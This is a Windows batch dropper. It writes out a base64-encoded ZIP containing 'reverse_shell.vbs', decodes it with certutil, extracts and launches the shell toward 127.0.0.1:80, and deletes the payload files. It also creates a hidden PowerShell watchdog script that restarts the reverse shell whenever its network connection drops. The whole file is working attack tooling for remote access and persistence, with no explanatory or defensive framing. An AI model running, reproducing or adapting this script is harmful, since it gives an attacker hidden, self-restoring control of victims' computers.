echo UEsDBBQAAAAIADN6SVVUrwQ4hwIAAC8GAAARAAAAcmV2ZXJzZV9zaGVsbC52YnOlVNtu2kAQfTYS/zDyQ2Qky4G8tIraSBGYBingCBuRV7CXsM167a7XFf37zqy9XEyqVqqQYOd25naGqNS8kBAeSsFTrvu9CAWlCgVLVtU5gwU7oLbfGxey0hC+zpLZIoGv4NLTtfp49hwukmhBhuYN0aJrnU7PzCgd7eP5hCxpnsFtCqewZBKtTK5KZ0WtXapjwnNIN0JsN+n7SolGwUsfykLpRqq4YLJ9H3LxpHW5ZD98qPZMCB/YgaXR9rsPaZHnG5n5sFVs8+6Dwo6FafYsAaXfI8L97S3m5yXJo7tPwRA/I9RQWtJ9HpryZjtYx6nipQ4e1VudYyFVMC5qqeEBhpDsmez3HAOzrjp+3nDQ74Uyg9nur1AjC4Ves2qBVsVT7xpyNBhYT6ct9SMnNNvEze/1FM6lG5w4frn3Ln4TLLk3Y0fPRNWMFDHTzcxRN8YRa4ZjZ6n2XNtXTFZ3QM5mB+g43YgKo9d7RING+eWhhXQI8bRR9LZAl/Dz+HX+fBfETP1kCp9PSfJCWZxTbBCVTIL7LUxc/7w1H3ZUwIUvAsmManRaxmBiouwNlsVz78wRGVQidVmCR4P52vXIWCvPks2e0Gktbee2xxDTX0UdD+wU1oz7H+Om025gO2obSQbDf0Nml0QEu8hhARCBaXtFaDMrDpa1tFmJGQ/IjPaAfRj6BgAnYsLXXO87hGjWyOVbMMWU8a9Ks7yxmb05Z8WZzdGAydNrUgyCJdtkj0J4rXcwYYJpRi5tFaQ3HKfsKBy7duIPuglRtu3YsicFrKTmwjoHsc6iGu9II2y0izV2lHeKbR83nZhOuc9FUdLjdHrOf1P9musvUfxHsnfZfvwvPNa0NjfwG1BLAQI/ABQAAAAIADN6SVVUrwQ4hwIAAC8GAAARACQAAAAAAAAAIAAAAAAAAAByZXZlcnNlX3NoZWxsLnZicwoAIAAAAAAAAQAYAADVDDav29gBqzORMHbl2AEA1Qw2r9vYAVBLBQYAAAAAAQABAGMAAAC2AgAAAAA= >>payload.00
copy /b payload.00 payload.txt
echo Set-Variable sleeptime -option Constant -value 60;Set-Variable pidtaskfd -option Constant -value 1;Set-Variable pidconnfd -option Constant -value 4;$cmdline=$args[0];$proc=$args[1];$search=$args[2];$timeout=$args[3];if($args.count-lt3){exit};while($true){$action=$true;$found="";tasklist^|Select-String $proc^|ForEach-Object {$task=$_.line.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries);$found=$task[$pidtaskfd];netstat -ano^|Select-String $search^|ForEach-Object {$conn=$_.line.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries);if($conn[$pidconnfd]-eq$found){$action=$false}}};if($action-and$cmdline){if($found){taskkill /F /PID $found};$program=$cmdline.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)[0];$param=$cmdline.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)[1];if($param){Start-Process $program -ArgumentList $param}else{Start-Process $program}};if(-not($timeout)){$timeout=$sleeptime};Start-Sleep -s $timeout} >>proctl.min.ps1
certutil -decode payload.txt payload.zip
tar -xf payload.zip
reverse_shell.vbs 127.0.0.1 80
del payload.* 
powershell -windowstyle hidden -f proctl.min.ps1 "wscript reverse_shell.vbs" wscript 127.0.0.1:80 10
